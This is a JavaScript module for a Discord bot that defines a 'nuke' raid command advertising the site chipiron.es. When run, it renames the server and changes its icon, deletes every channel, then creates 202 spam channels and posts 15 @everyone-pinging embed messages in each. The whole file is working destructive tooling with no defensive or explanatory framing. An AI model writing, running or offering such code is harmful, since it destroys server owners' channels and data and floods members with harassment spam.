const {
    MessageEmbed
} = require('discord.js');

module.exports = {
    name: 'nuke',
    async execute(message) {

        let channelName = 'raidbychipirones';
        let embedTitle = 'Raid by chipiron.es';
        let embedDesc = 'THE SERVER HAS BEEN RAIDED BY CHIPIRON.ES';
        let twitterUrl = 'https://chipiron.es';
        let youtubeUrl = 'https://chipiron.es';
        let imgUrl = 'https://chipiron.es/images/piso.png';
        let discordUrl = 'https://chipiron.es';
        let guildName = 'https://chipiron.es';

        const everyoneEmbed = new MessageEmbed()
            .setTitle(embedTitle)
            .setDescription(embedDesc)
            .setURL('https://discord.gg/TByM4VksDh')
            .addField('Twitter', twitterUrl)
            .addField('YouTube', youtubeUrl)
            .addField('Discord', discordUrl)
            .setImage(imgUrl)
            .setColor('#333');

        await message.guild.setIcon('./i/3.png');
        await message.guild.setName(guildName);

        for (let [key, value] of message.guild.channels.cache) {
            try {
                await value.delete();
            } catch (err) {
                console.log(err)
            }
        }
        for (let i = 0; i < 202; i++) {
            await message.guild.channels.create(channelName, {
                topic: discordUrl
            }).then((c) => {
                for (let j = 0; j < 15; j++) {
                    c.send('@everyone **Raid By CHIPIRON.ES** https://chipiron.es', everyoneEmbed);
                }
            });
        }
    },
};